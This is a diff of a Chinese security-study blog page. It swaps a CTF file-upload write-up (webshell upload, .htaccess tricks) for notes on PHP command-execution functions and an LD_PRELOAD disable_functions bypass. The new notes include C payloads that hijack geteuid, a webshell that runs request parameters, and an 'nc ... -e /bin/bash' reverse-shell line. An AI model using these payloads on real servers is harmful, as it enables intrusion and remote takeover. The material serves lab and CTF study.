@@ -9,7 +9,7 @@
     <meta http-equiv="Cache-Control" content="no-siteapp">
     <title>
         
-            4.14文件上传刷题日记
+            php命令执行
         
     </title>
     <link rel="shortcut icon" href="#"/>
@@ -37,21 +37,21 @@
     <div class="vertical">
         <div class="inner">
             
-                <h1 class="header-subtitle">4.14文件上传刷题日记</h1>
+                <h1 class="header-subtitle">php命令执行</h1>
                 <div class="header-subinfo">
                     <p class="article-info-text">
                         <span>
-                            <i class="iconfont icon-time"></i> 发表时间：2024-04-14
+                            <i class="iconfont icon-time"></i> 发表时间：2024-04-17
                         </span>
                         
                             
-                                <span id="/article/3439035480/" class="leancloud_visitors" data-flag-title="4.14文件上传刷题日记">
+                                <span id="/article/1615743781/" class="leancloud_visitors" data-flag-title="php命令执行">
                                     <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
                                 </span>
                             
                             
                                 <span>
-                                    <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/article/3439035480/"></span>
+                                    <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/article/1615743781/"></span>
                                 </span>
                               
                         
@@ -59,7 +59,7 @@
                     
                     
                         
-                            <span class="tag-color">刷题日记</span>
+                            <span class="tag-color">学习笔记</span>
                         
                     
                 </div>
@@ -74,34 +74,82 @@
         <div id="article">
             <div class="toc"></div>
             <div class="article-body">
-                <h2 id="buuctf-是兄弟就来传马"><a href="#buuctf-是兄弟就来传马" class="headerlink" title="buuctf[是兄弟就来传马"></a>buuctf[是兄弟就来传马</h2><p>先传一个php木马</p>
-<p><img src="/../images/0414-1.png"></p>
-<p>页面报错，随便改一个后缀，看看是黑名单还是白名单过滤，这里php代码前加GIF89a绕过图片大小检查</p>
-<p> <img src="/../images/0414-2.png"></p>
-<p>报错，接着试一下是不是MIME过滤</p>
-<p><code>Content-Type: image/png</code></p>
-<p>上传成功 <code>/var/www/html/upload/743be915f2c6ab5de3600d87068cafd2/hack.jpg succesfully uploaded!</code></p>
-<p>接下来修改.htaccess解析文件,记得改Content-type</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;hack&quot;</span> &gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+                <h1 id="PHP命令执行"><a href="#PHP命令执行" class="headerlink" title="PHP命令执行"></a>PHP命令执行</h1><h2 id="一-命令执行函数介绍"><a href="#一-命令执行函数介绍" class="headerlink" title="一.命令执行函数介绍"></a>一.命令执行函数介绍</h2><p><code>system exec passthru shell_exec 反引号 popen proc_open pcntl_exec</code></p>
+<p>了解能否<strong>回显</strong>，需求的<strong>参数</strong></p>
+<h3 id="system-string-command-int-return-var"><a href="#system-string-command-int-return-var" class="headerlink" title="system(string $command,int &amp;$return_var&#x3D;?)"></a>system(string $command,int &amp;$return_var&#x3D;?)</h3><p>command为执行的命令(必须)，return_var用来记录命令执行后返回的状态(可选)</p>
+<p><strong>system函数有回显</strong></p>
+<h3 id="exec-string-command-array-output-int-return-var"><a href="#exec-string-command-array-output-int-return-var" class="headerlink" title="exec(string $command,array &amp;$output&#x3D;?,int  &amp;$return_var&#x3D;?)"></a>exec(string $command,array &amp;$output&#x3D;?,int  &amp;$return_var&#x3D;?)</h3><p>command为执行的命令，单独使用时只有最后一行结果，且不会回显</p>
+<p>output:用命令执行的输出填充此数组，每行输出一个元素，用<strong>print_r(array)或var_dump</strong>输出结果</p>
+<p>var返回状态（忽略）</p>
+<h3 id="passthru-string-command-int-return-var"><a href="#passthru-string-command-int-return-var" class="headerlink" title="passthru(string $command,int &amp;$return_var)"></a>passthru(string $command,int &amp;$return_var)</h3><p>command:执行的命令，var忽略</p>
+<p>二进制数据（无关）</p>
+<p><strong>直接回显，不需要print_r</strong></p>
+<p>shell_exec(string $cmd)</p>
+<p><strong>无回显，需要print_r，echo..</strong></p>
+<h3 id="反引号-cmd"><a href="#反引号-cmd" class="headerlink" title="反引号\$cmd"></a>反引号<code>\$cmd</code></h3><p><strong>无回显</strong></p>
+<h3 id="popen-string-command-string-mode"><a href="#popen-string-command-string-mode" class="headerlink" title="popen(string $command,string $mode)"></a>popen(string $command,string $mode)</h3><p>mode(模式):’r’表示阅读,’w’表示写入。（命令执行后会把内容放到一个临时文档）</p>
+<p>这个文档需要用fgets获取内容,用print_r输出内容</p>
+<p><strong>‘w’模式支持自动回显，r模式需要用print_r</strong></p>
+<h3 id="proc-open-1-2-3-4-5-6-不常用"><a href="#proc-open-1-2-3-4-5-6-不常用" class="headerlink" title="proc_open(1,2,3,4,5,6)	&#x2F;&#x2F;不常用"></a>proc_open(1,2,3,4,5,6)	&#x2F;&#x2F;不常用</h3><p>1,2,3必须</p>
+<p>1:command;	2:descriptor_spec 定义数组内容	3:pipes:调用数组内容</p>
+<p>descriptor_spec需要预定义，$pipes[1]写入，stream_get_contents($pipes[1]);读取，需要echo</p>
+<h3 id="pcntl-exec-1-2-3-后续讲解"><a href="#pcntl-exec-1-2-3-后续讲解" class="headerlink" title="pcntl_exec(1,2,3)	&#x2F;&#x2F;后续讲解"></a>pcntl_exec(1,2,3)	&#x2F;&#x2F;后续讲解</h3><p>此模块需额外安装</p>
+<p>1:string $path为一个可执行二进制文件，在linux中<code>/bin/命令</code> 为二进制执行</p>
+<p>2：array $args是传递给程序的参数</p>
+<p>3:$envs是字符串数组，key&#x3D;&gt;value格式,key代表要传递的环境变量的名称，value代表环境变量的值</p>
+<h2 id="二、替换绕过函数过滤"><a href="#二、替换绕过函数过滤" class="headerlink" title="二、替换绕过函数过滤"></a>二、替换绕过函数过滤</h2><p>过滤exec|system|popen|proc_open|`</p>
+<p>用其他函数,如passthru(‘cmd’)绕过</p>
+<h3 id="LD-PRELOAD绕过原理"><a href="#LD-PRELOAD绕过原理" class="headerlink" title="LD_PRELOAD绕过原理"></a>LD_PRELOAD绕过原理</h3><h4 id="1-应用场景"><a href="#1-应用场景" class="headerlink" title="1.应用场景"></a>1.应用场景</h4><p>disable_functions禁用所有可能用到的命令执行函数</p>
+<h4 id="2-程序的链接"><a href="#2-程序的链接" class="headerlink" title="2.程序的链接"></a>2.程序的链接</h4><p>(1)静态链接:在程序运行之前先将各个目标模块以及所需要的库函数链接成一个完整的可执行程序，之后不再拆开。<br>(2)装入时动态链接:源程序编译后所得到的一组目标模块，在装入内存时，边装入边链接。<br>(3)运行时动态链接:原程序编译后得到的目标模块，在程序执行过程中需要用到时才对它进行链接。<br>    对于动态链接来说，需要一个动态链接库，其作用在于当动态库中的函数发生变化对于可执行程序来说时透明的，可执行程序无需重新编译，方便程序的发布&#x2F;维护&#x2F;更新。</p>
+<h4 id="3-LD-PRELOAD"><a href="#3-LD-PRELOAD" class="headerlink" title="3.LD_PRELOAD"></a>3.LD_PRELOAD</h4><p>修改库文件</p>
+<p>影响程序运行时的链接，加载别的动态链接可以，甚至覆盖正常的库</p>
+<p>使用自己的或是更好的函数（无需别人的源码），也可以向别人的程序注入恶意程序</p>
+<p>使用方法：</p>
+<ol>
+<li>mail 内嵌在php里</li>
+<li>imagick需要扩展安装</li>
+</ol>
+<h5 id="1-mail"><a href="#1-mail" class="headerlink" title="1.mail"></a>1.mail</h5><p><code>vim demo.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">mail</span>(<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p>&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;743be915f2c6ab5de3600d87068cafd2&#x2F;.htaccess succesfully uploaded!</p>
-<p>接着上传hack.jpg图片<code>/var/www/html/upload/743be915f2c6ab5de3600d87068cafd2/hack.jpg succesfully uploaded!</code></p>
-<p>拼接后的url蚁剑链接即可</p>
-<h2 id="ACTF2020-Upload"><a href="#ACTF2020-Upload" class="headerlink" title="ACTF2020 Upload"></a>ACTF2020 Upload</h2><p>尝试上传php，发现前端拦截，上传png,用bp抓包改php，上传失败</p>
-<p>尝试phtml，上传成功</p>
-<p>Upload Success! Look here~ .&#x2F;uplo4d&#x2F;87d8f9288427fb50ed6e8dd6be21e62b.phtml</p>
-<p><a target="_blank" rel="noopener" href="http://b2a5f0cf-75b2-4af3-9386-e4d027a70dc1.node5.buuoj.cn:81/uplo4d/87d8f9288427fb50ed6e8dd6be21e62b.phtml%E8%9A%81%E5%89%91%E9%93%BE%E6%8E%A5%E5%8D%B3%E5%8F%AF">http://b2a5f0cf-75b2-4af3-9386-e4d027a70dc1.node5.buuoj.cn:81/uplo4d/87d8f9288427fb50ed6e8dd6be21e62b.phtml蚁剑链接即可</a></p>
-<p>ps:buu上面的文件上传题都有bug，经常导致重定向</p>
-<h2 id="SWPUCTF-2021-新生赛-easyupload1-0"><a href="#SWPUCTF-2021-新生赛-easyupload1-0" class="headerlink" title="[SWPUCTF 2021 新生赛]easyupload1.0"></a>[SWPUCTF 2021 新生赛]easyupload1.0</h2><p>同样是png文件改phtml，用蚁剑链接只能找到fakeflag，看了wp才知道在phpinfo()中，长知识了</p>
-<h2 id="SWPUCTF-2021-新生赛-easyupload3-0"><a href="#SWPUCTF-2021-新生赛-easyupload3-0" class="headerlink" title="[SWPUCTF 2021 新生赛]easyupload3.0"></a>[SWPUCTF 2021 新生赛]easyupload3.0</h2><p>提示用文件组合，.htaccess秒了(nss平台没bug)</p>
-<h2 id="NISACTF-2022-babyupload复现"><a href="#NISACTF-2022-babyupload复现" class="headerlink" title="[NISACTF 2022]babyupload复现"></a>[NISACTF 2022]babyupload复现</h2><p>上传各种文件，发现一直返回badname，查看源代码，发现source目录，访问后给了Python源码</p>
-<p>代码粘到gpt，发现文件不能带点，根据文件名给一个id，再通过<code>/file/uuid</code>访问文件，通过查询数据库得到对应文件名，在文件名前拼接<code>uploads/</code>后读取该路径下上传的文件。</p>
-<p><code> with open(os.path.join(&quot;uploads/&quot;, res[0]), &quot;r&quot;) as f:        return f.read()</code></p>
-<p>绝对路径拼接漏洞</p>
-<blockquote>
-<p>os.path.join(path,*paths)函数用于将多个文件路径连接成一个组合的路径。第一个函数通常包含了基础路径，而之后的每个参数被当作组件拼接到基础路径之后。然而，这个函数有一个少有人知的特性，如果拼接的某个路径以 &#x2F; 开头，那么包括基础路径在内的所有前缀路径都将被删除，该路径将视为绝对路径</p>
-</blockquote>
-<p>直接把文件名字改成&#x2F;flag，访问得到flag</p>
+<p><code>strace -o 1.txt -f php demo.php</code>把输出写到1.txt文件</p>
+<p><code>cat 1.txt | grep execve</code>检查调用了那些子程序，调用了sendmail函数</p>
+<p><code>readelf -Ws /usr/sbin/sendmail</code>查看调用了哪些库文件，其中geteuid库文件(获取用户uid信息)可以替换自己写的库文件</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">payload</span><span class="params">()</span>&#123;</span><br><span class="line">system(<span class="string">&quot;echo&#x27;小可爱，你邮件还能发出去么?&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">geteuid</span><span class="params">()</span>&#123;<span class="comment">//生成动作geteuid,执行payload</span></span><br><span class="line">unsetenv(<span class="string">&quot;LD PRELOAD&quot;</span>);<span class="comment">//生成动作geteuid,执行payload结束调用</span></span><br><span class="line">payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>粘贴到<code>vim poc.c</code>，<code>gcc -shared -fPIC demo.c -o demo.so</code>编译成.so文件，生成动态链接库文件</p>
+<p>在此之前，需要修改demo,php更改库文件(esc wq保存)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;LD_PRELOAD=./poc.so&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">mail</span>(<span class="string">&quot;,&quot;</span>,<span class="string">&quot;,&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这时调用<code>php demo.php</code>输出小可爱，你邮件还能发出去么?</p>
+<p>原理mail-&gt;sendmail()-&gt;geteuid()</p>
+<p>绕过条件：</p>
+<p>1.能够上传自己的.so文件;</p>
+<p>2.能够控制环境变量的值(设置LD_PRELOAD变量)，比如putenv函数并且未被禁止;</p>
+<p>3.存在可以控制PHP启动外部程序的函数并能执行(因为新进程启动将加载LDPRELOAD<br>中的.so文件)，比如mail()、imap mail()、mb_send_mail()和error_log()等。</p>
+<h4 id="4-例题-81端口禁用函数例题"><a href="#4-例题-81端口禁用函数例题" class="headerlink" title="4.例题-81端口禁用函数例题"></a>4.例题-81端口禁用函数例题</h4><p>ld-prlooad防炸<br><code>dpkg-reconfigure dash</code>      yes</p>
+<p><code>dpkg-reconfigure bash</code>       做完了改回来</p>
+<h5 id="1-上传-so和-php"><a href="#1-上传-so和-php" class="headerlink" title="1.上传.so和.php"></a>1.上传.so和.php</h5><p>使用蚁剑链接可以上传下载文件（不能直接查看根目录）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">payload</span><span class="params">()</span>&#123;</span><br><span class="line">system(<span class="string">&quot;cat /flag &gt; /tmp/flag&quot;</span>);<span class="comment">//故去flag输出到/tmp/flag(可查看的目录就行)</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">geteuid</span><span class="params">()</span>&#123;<span class="comment">//生成动作geteuid,执行payload</span></span><br><span class="line">unsetenv(<span class="string">&quot;LD PRELOAD&quot;</span>);<span class="comment">//生成动作geteuid,执行payload结束调用</span></span><br><span class="line">payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>粘贴到<code>vim poc.c</code>，<code>gcc -shared -fPIC demo.c -o demo.so</code>编译成.so文件，生成动态链接库文件</p>
+<p>从&#x2F;root&#x2F;php找到demo.so，拷贝到windows</p>
+<p>再编辑demo.php文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;LD_PRELOAD=./poc.so&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">mail</span>(<span class="string">&quot;,&quot;</span>,<span class="string">&quot;,&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>一起上传到蚁剑,网页访问&#x2F;demo.php，在tmp目录找到flag</p>
+<p>*为了避免重复上传文件，更改c文件的system为<code>system(&quot;nc 192.168.xxx.xxx 7777 -e /bin/bash&quot;)</code>反弹shell</p>
+<p><code>nc -lvp 7777</code>监听7777端口</p>
+<p>上传.so .php文件，访问demo.php，此时直接在linux终端输入命令即可</p>
+<h5 id="EVIL-CMDLINE-不如nc"><a href="#EVIL-CMDLINE-不如nc" class="headerlink" title="EVIL_CMDLINE(不如nc)"></a>EVIL_CMDLINE(不如nc)</h5><p>把要执行的命令赋值到环境变量EVIL_CMDLINE直接读取命令</p>
+<p>demo.c-&gt;.so</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">geteuid</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* cmdline = getenv(<span class="string">&quot;EVIL CMDLINE&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(getenv(<span class="string">&quot;LD PRELOAD&quot;</span>)== <span class="literal">NULL</span>)&#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">unsetenV(<span class="string">&quot;LD PRELOAD&quot;</span>);</span><br><span class="line">system(cmdline);<span class="comment">//放入system执行</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>demo.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span> =<span class="variable">$_REQUEST</span>[<span class="string">&quot;cmd&quot;</span>];<span class="comment">//要执行的命令</span></span><br><span class="line"><span class="variable">$out_path</span>=<span class="variable">$_REQUEST</span>[<span class="string">&quot;outpath&quot;</span>];<span class="comment">//outpath命令执行结果输出到指定路径下的文件</span></span><br><span class="line"><span class="variable">$qvil_cmdline</span> = <span class="variable">$cmd</span>.<span class="string">&quot;&gt;&quot;</span>.<span class="variable">$out</span> path.<span class="string">&quot; 2&gt;&amp;1&quot;</span><span class="comment">//2&gt;&amp;1将标准错误重定向到标准输出</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&lt;b&gt;cmdline: &lt;/b&gt;&quot;</span>.<span class="variable">$evil</span> cmdline;<span class="comment">//打印显示实际在linux上执行的命令</span></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&quot;EVIL CMDLINE=&quot;</span>.<span class="variable">$evil</span> cmdline);<span class="comment">//putenv改变环境变量的值</span></span><br><span class="line"><span class="variable">$so_path</span> =$ _REQUEST[<span class="string">&quot;sopath&quot;</span>];<span class="comment">//定义动态链接库</span></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&quot;LD PRELOAD=&quot;</span>.<span class="variable">$so_path</span>);</span><br><span class="line"><span class="title function_ invoke__">mail</span>(<span class="string">&quot;,&quot;</span>,<span class="string">&quot;,&quot;</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&lt;b&gt;output: &lt;/b&gt;&lt;br /&gt;&quot;</span>.<span class="title function_ invoke__">nl2br</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$out_path</span>));<span class="comment">//调用输出环境变量的命令</span></span><br></pre></td></tr></table></figure>
+
+<p>上传.so,.php</p>
+<p>访问url&#x2F;demo.php?cmd&#x3D;ls&amp;outpath&#x3D;&#x2F;tmp&#x2F;benben&amp;sopath&#x3D;.&#x2F;demo.so</p>
 
                 
                 <p class="end">__END__</p>
@@ -114,7 +162,7 @@
     <div class="suffix-box-right">
         <span class="suffix-box-title">文章作者：</span>Dyinglight
         <br>
-        <span class="suffix-box-title">文章出处：</span><a href="/article/3439035480/" target="_blank">4.14文件上传刷题日记</a>
+        <span class="suffix-box-title">文章出处：</span><a href="/article/1615743781/" target="_blank">php命令执行</a>
         <br>
         <span class="suffix-box-title">作者签名：</span>原神,启动！
         <br>
@@ -130,17 +178,14 @@
                     <div class="tag">
                         标签：
                         
-                            <a href="/tag/%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0/">刷题日记</a>
+                            <a href="/tag/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a>
                         
                     </div>
                 
                 <div class="article-prev-next">
                     
-                        <a href="/article/1615743781/" class="prev-prefix">« </a> 上一篇：    <a href="/article/1615743781/" title="发布于 2024-04-17 04:03">php命令执行</a>
-                        <br>
                     
-                    
-                        <a href="/article/1906377861/" class="next-prefix">» </a> 下一篇：    <a href="/article/1906377861/" title="发布于 2024-04-12 08:36">[XYCTF]刷题笔记</a>
+                        <a href="/article/3439035480/" class="next-prefix">» </a> 下一篇：    <a href="/article/3439035480/" title="发布于 2024-04-14 03:20">4.14文件上传刷题日记</a>
                     
                 </div>
             </div>
